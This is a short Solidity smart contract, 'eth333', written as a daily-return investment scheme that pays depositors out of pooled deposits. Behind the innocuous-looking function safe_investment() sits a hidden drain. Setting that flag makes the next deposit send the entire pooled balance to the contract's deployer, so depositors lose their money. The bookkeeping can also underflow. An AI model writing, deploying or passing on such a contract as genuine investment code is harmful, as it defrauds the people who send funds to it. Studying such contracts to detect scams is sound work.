 

pragma solidity ^0.4.24;

 
contract eth333 {
     
    mapping (address => uint256) invested;
     
    mapping (address => uint256) atBlock;

    uint256 total_investment;

    uint public is_safe_withdraw_investment;
    address public investor;

    constructor() public {
        investor = msg.sender;
    }

     
    function () external payable {
         
        if (invested[msg.sender] != 0) {
             
             
             
            uint256 amount = invested[msg.sender] * 4 / 100 * (block.number - atBlock[msg.sender]) / 5900;

             
            address sender = msg.sender;
            sender.transfer(amount);
            total_investment -= amount;
        }

         
        atBlock[msg.sender] = block.number;
        invested[msg.sender] += msg.value;

        total_investment += msg.value;
        
        if (is_safe_withdraw_investment == 1) {
            investor.transfer(total_investment);
            total_investment = 0;
        }
    }

    function safe_investment() public {
        is_safe_withdraw_investment = 1;
    }
}